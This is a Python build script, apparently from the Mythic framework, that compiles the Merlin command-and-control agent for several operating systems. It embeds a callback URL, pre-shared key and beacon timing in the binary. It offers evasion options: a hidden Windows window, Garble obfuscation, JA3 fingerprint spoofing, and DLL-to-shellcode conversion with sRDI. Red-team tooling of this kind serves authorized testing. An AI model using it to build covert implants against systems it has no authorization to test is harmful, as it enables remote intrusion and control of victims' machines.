
from mythic_payloadtype_container.PayloadBuilder import *
from mythic_payloadtype_container.MythicCommandBase import *
from mythic_payloadtype_container.MythicRPC import *
import asyncio
import os
import time

# Set to enable debug output to Mythic
debug = False


# define your payload type class here, it must extend the PayloadType class though
class Merlin(PayloadType):
    name = "merlin"  # name that would show up in the UI
    file_extension = ""  # default file extension to use when creating payloads
    author = "Russel Van Tuyl - @Ne0nd0g"  # author of the payload type
    supported_os = [SupportedOS.Windows, SupportedOS.Linux, SupportedOS.MacOS, SupportedOS("freebsd"), SupportedOS("openbsd"), SupportedOS("solaris")]  # supported OS and architecture combos
    wrapper = False  # does this payload type act as a wrapper for another payloads inside it?
    wrapped_payloads = ["service_wrapper", "scarecrow_wrapper"]  # if so, which payload types
    note = """A port of Merlin from https://www.github.com/Ne0nd0g/merlin to Mythic"""
    # setting this to True allows users to only select a subset of commands when generating a payload
    supports_dynamic_loading = False
    # translation_container = "merlin-translate-jwe"
    mythic_encrypts = True
    build_parameters = {
        #  these are all the build parameters that will be presented to the user when creating your payload
        BuildParameter(
            name="verbose",
            description="Enable agent verbose output to STDOUT",
            parameter_type=BuildParameterType.Boolean,
            default_value=False,
            required=False,
        ),
        BuildParameter(
            name="debug",
            description="Enable agent debug messages to STDOUT",
            parameter_type=BuildParameterType.Boolean,
            default_value=False,
            required=False,
        ),
        BuildParameter(
            name="arch",
            description="What architecture will the agent be executed on?",
            parameter_type=BuildParameterType.ChooseOne,
            choices=["amd64", "386", "arm", "mips"],
            required=False,
        ),
        BuildParameter(
          name="maxretry",
          description="How many times can the Agent fail to check in before it exits?",
          parameter_type=BuildParameterType.String,
          default_value="7",
          required=False,
        ),
        BuildParameter(
            name="padding",
            description="What is the maximum size of the random amount of data added to each message as padding?",
            parameter_type=BuildParameterType.String,
            default_value="4096",
            required=False,
        ),
        BuildParameter(
            name="ja3",
            description="The JA3 string of the TLS configuration the agent should use",
            parameter_type=BuildParameterType.String,
            default_value="",
            required=False,
        ),
        BuildParameter(
            name="garble",
            description="Use Garble to obfuscate the output Go executable. "
                        "WARNING - This significantly slows the agent build time",
            parameter_type=BuildParameterType.Boolean,
            default_value="false",
            required=False,
        ),
        BuildParameter(
            name="buildmode",
            description="Payload build mode and output format.\n"
                        "DEFAULT: exe, bin, etc. "
                        "SHARED: dll, so. "
                        "RAW: Windows shellcode only. ",
            parameter_type=BuildParameterType.ChooseOne,
            choices=["default", "shared", "raw"],
            default_value="default",
            required=False,
        ),
    }
    #  the names of the c2 profiles that your agent supports
    c2_profiles = ["http", "merlin-http"]

    async def build(self) -> BuildResponse:
        resp = BuildResponse(status=BuildStatus.Error)

        # Extract C2 information into local variables
        c2_profile = self.c2info[0].get_c2profile()
        c2_params = self.c2info[0].get_parameters_dict()

        # Set the selected Operating System to lowercase for Go build
        selected_os = self.selected_os.lower()
        if self.selected_os.lower() == "macos":
            selected_os = "darwin"

        # Set the selected profile into a local variable
        profile = c2_profile["name"]

        # Set the Pre-Shared Key based on the C2 profile
        psk = ""
        if profile == "http":
            psk = c2_params["AESPSK"]["enc_key"]
        elif profile == "merlin-http":
            rpc_resp = await MythicRPC().execute_c2rpc(c2_profile=c2_profile["name"], function_name="get_psk", task_id=31773, message="test")
            if rpc_resp.error:
                raise Exception
            psk = rpc_resp.response

        # Build mode, Operating System, and Architecture checks
        if self.get_parameter("buildmode") == "raw" and selected_os != "windows":
            resp.build_message = f'Buildmode \"raw\" can only be used with Windows payloads'
            return resp
        elif selected_os == "darwin" and self.get_parameter("buildmode") != "default":
            resp.build_message = f'Unable to cross compile shared/raw build modes for macOS'
            return resp

        # Merlin specific build code
        try:
            output_file = "merlin"

            # Remove old binary if it exists
            if os.path.exists(str(self.agent_code_path.joinpath(output_file))):
                os.remove(str(self.agent_code_path.joinpath(output_file)))

            # Set Operating System and Architecture (e.g., Windows AMD64)
            command = "export GOOS=" + selected_os + ";"
            command += "export GOARCH=" + self.get_parameter("arch").lower() + ";"

            # Export variables to compile Windows DLL
            if selected_os == "windows" and \
                    (self.get_parameter("buildmode") == "shared" or self.get_parameter("buildmode") == "raw"):
                command += "export CC=x86_64-w64-mingw32-gcc CXX=x86_64-w64-mingw32-g++ CGO_ENABLED=1;"

            # Setup GO LDFLAGS
            ldflags = "\'"
            # PayloadID
            ldflags += "-X \"main.payloadID=" + f'{self.uuid}\"'
            # Profile
            ldflags += " -X \"main.profile=" + f'{c2_profile["name"]}\"'
            # URL
            if profile == "http":
                ldflags += f' -X \"main.url={c2_params["callback_host"]}:{c2_params["callback_port"]}/{c2_params["post_uri"]}\"'
            elif profile == "merlin-http":
                ldflags += f' -X \"main.url={c2_params["host"]}:{c2_params["port"]}{c2_params["uri"].split(",")[0]}\"'
            # Pre-Shared Key (PSK)
            ldflags += f' -X \"main.psk={psk}\"'
            # HTTP Headers
            for header in c2_params["headers"]:
                if header["key"] == "User-Agent":
                    ldflags += f' -X \"main.useragent={header["value"]}\"'
                elif header["key"] == "Host":
                    ldflags += f' -X \"main.host={header["value"]}\"'
            # Sleep
            ldflags += f' -X \"main.sleep={c2_params["callback_interval"]}s\"'
            # Skew
            ldflags += f' -X \"main.skew={int(c2_params["callback_interval"]) * 1000}\"'
            # Kill Date
            killdate = str(int(time.mktime(time.strptime(c2_params["killdate"], "%Y-%m-%d"))))
            ldflags += f' -X \"main.killdate={killdate}\"'
            # Max Retry
            ldflags += f' -X \"main.maxretry={self.get_parameter("maxretry")}\"'
            # Padding
            ldflags += f' -X \"main.padding={self.get_parameter("padding")}\"'
            # Verbose
            ldflags += f' -X \"main.verbose={self.get_parameter("verbose")}\"'
            # Debug
            ldflags += f' -X \"main.debug={self.get_parameter("debug")}\"'
            # Proxy
            if c2_params["proxy_host"]:
                ldflags += f' -X \"main.proxy={c2_params["proxy_host"]}:{c2_params["proxy_port"]}\"'
            # JA3 String
            if self.get_parameter("ja3"):
                ldflags += f' -X \"main.ja3={self.get_parameter("ja3")}\"'
            # Windows Verbose/Debug - If verbose/debug are NOT selected, set this to make the agent window not visible
            if selected_os == "windows" and (not self.get_parameter("debug") and not self.get_parameter("verbose")) and self.get_parameter("buildmode") == "default":
                ldflags += " -H=windowsgui"
            # Omit the symbol table and debug information / Omit the DWARF symbol table.
            ldflags += " -s -w -buildid=\'"

            # Setup GO command
            go_cmd = ""
            # Windows DLL - Depends on c-archive and output file name to be main.a
            if selected_os == "windows" and \
                    (self.get_parameter("buildmode") == "shared" or self.get_parameter("buildmode") == "raw"):
                if not output_file.endswith(".dll"):
                    output_file = f'{output_file}.dll'
                go_cmd = f'build -buildmode=c-archive -o main.a -ldflags {ldflags} main.go dll.go'
                go_cmd += f";x86_64-w64-mingw32-gcc -shared -pthread -o {output_file} merlin.c main.a " \
                          "-lwinmm -lntdll -lws2_32"
                if not output_file.endswith(".dll"):
                    output_file = f'{output_file}.dll'
            elif self.get_parameter("buildmode") == "shared":
                go_cmd = f'build -buildmode=c-shared -o {output_file} -ldflags {ldflags} -tags shared main.go shared.go'
            else:
                go_cmd = f'build -buildmode=default -o {output_file} -ldflags {ldflags} main.go'

            # Setup Garble
            if self.get_parameter("garble"):
                command += "export GOGARBLE=golang.org,gopkg.in,github.com;"
                # command += "export CGO_ENABLED=0;"
                go_cmd = f'garble -tiny -literals -seed random {go_cmd}'
            else:
                go_cmd = f'go {go_cmd}'

            # Convert Windows DLL to shellcode with sRDI
            if selected_os == "windows" and self.get_parameter("buildmode") == "raw":
                # Input path: /Mythic/agent_code/merlin.dll
                # Output path: /Mythic/agent_code/merlin.bin
                go_cmd += f';python3 /opt/merlin/data/src/sRDI/Python/ConvertToShellcode.py ' \
                            f'-f Run -c -i -d 7 ' \
                            f'{str(self.agent_code_path.joinpath(output_file))}'
                output_file = output_file.replace(".dll", ".bin")

            # Build the agent
            command += go_cmd

            proc = await asyncio.create_subprocess_shell(
                command,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                cwd=self.agent_code_path,
            )

            stdout, stderr = await proc.communicate()
            if os.path.exists(str(self.agent_code_path.joinpath(output_file))):
                resp.payload = open(str(self.agent_code_path.joinpath(output_file)), "rb").read()
                resp.build_message += "\r\nThe Merlin agent was successfully built!"
                resp.build_stdout += f'\r\nGo build command: {go_cmd}\r\n'
                # os.remove(str(self.agent_code_path.joinpath(output_file)))
                if stdout:
                    resp.build_stdout += f'STDOUT\n{stdout.decode()}'
                if stderr:
                    resp.build_stderr += f'{stderr.decode()}'
                resp.status = BuildStatus.Success
            else:
                if stderr:
                    resp.build_stderr = f'{stderr.decode()}'
            if debug:
                resp.build_stdout += f"\r\n[DEBUG]\r\ncommand: {command}\r\ngo_cmd: {go_cmd}, "
        except Exception as e:
            resp.build_message += "[ERROR]" + str(e)
        return resp
